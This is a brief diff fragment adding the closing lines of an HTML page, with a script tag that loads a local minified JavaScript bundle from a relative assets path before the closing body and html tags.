+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
